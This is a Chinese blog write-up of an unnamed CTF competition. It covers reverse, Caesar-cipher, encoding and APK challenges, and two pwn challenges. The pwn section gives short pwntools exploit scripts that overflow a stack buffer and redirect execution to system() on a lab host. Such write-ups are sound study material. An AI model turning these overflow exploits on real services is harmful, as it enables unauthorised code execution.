---
title: 记一次不知名比赛的WP
tags:
  - 比赛
  - CTF
permalink: /archives/10397/
createTime: 2023-06-24 01:28:52
---
# Reverse

## Reverse_签到

找到main函数，就看到了flag

![image-20230620090120146](https://img.crzliang.cn/img/image-20230620090120146.png)

# Crypto

## easily_Caesar

凯撒解码一把梭，key=24

![image-20230620094549028](https://img.crzliang.cn/img/image-20230620094549028.png)

# Misc

## medium_CTFvalues

16进制转文本得到unicode编码

![image-20230620094134558](https://img.crzliang.cn/img/image-20230620094134558.png)

unicode转ascii码得到base64字符串

![image-20230620094222386](https://img.crzliang.cn/img/image-20230620094222386.png)

![image-20230620094242228](https://img.crzliang.cn/img/image-20230620094242228.png)

base64解码得到一个字符串，然后ascii码转文本

![image-20230620094305264](https://img.crzliang.cn/img/image-20230620094305264.png)

## difficult_mobile_3

jadx打开然后全局搜索base64，找字符串后进行ascii转字符

![image-20230620121849142](https://img.crzliang.cn/img/image-20230620121849142.png)

得到，把ip地址进行包裹提交

![image-20230620121956543](https://img.crzliang.cn/img/image-20230620121956543.png)

# Pwn

## easily_pwn_1

程序分析：64位程序，开启了NX保护

![image-20230620140607482](https://img.crzliang.cn/img/image-20230620140607482.png)

代码分析：有一个read函数和write函数，可以发现read函数（这里buf只有0x80字节，而read需要从buf中读取0x200个字节），存在溢出条件。

![image-20230620140450114](https://img.crzliang.cn/img/image-20230620140450114.png)

然后找是否存在后门函数

![屏幕截图 2023-06-20 140859](https://img.crzliang.cn/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-20%20140859.png)

找到system函数的地址，是简单的栈溢出，找到偏移量为0x80+8，然后覆盖返回地址就可以了

![屏幕截图 2023-06-20 141330](https://img.crzliang.cn/img/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-20%20141330.png)

exp：

```python
from pwn import *
io = remote('192.168.1.1',9002)
# io = process("./helloworld")
offset = 0x80 + 8

payload = offset*b'a' + p64(0x40059A)

io.sendline(payload)
io.interactive()
```

## medium_pwn_2

程序分析：32位程序，开启了NX保护

![image-20230620141634557](https://img.crzliang.cn/img/image-20230620141634557.png)

代码分析：和pwn1一样，看到了read函数，判断存在栈溢出，

![image-20230620141720828](https://img.crzliang.cn/img/image-20230620141720828.png)

又看到了system函数,但是少了'/bin/sh'

![image-20230620141900964](https://img.crzliang.cn/img/image-20230620141900964.png)

找到了system函数，/bin/sh参数，以及溢出条件。明显栈溢出

![image-20230620142144275](https://img.crzliang.cn/img/image-20230620142144275.png)

![image-20230620142020421](https://img.crzliang.cn/img/image-20230620142020421.png)

exp：

```python
from pwn import *
io = remote('192.168.1.1',9006)
# io = process("./helloworld")
offset = 0x88 + 4

payload = offset*b'a' + p32(0x0804845C) + p32(0x0804A024) 

io.sendline(payload)
io.interactive()
```
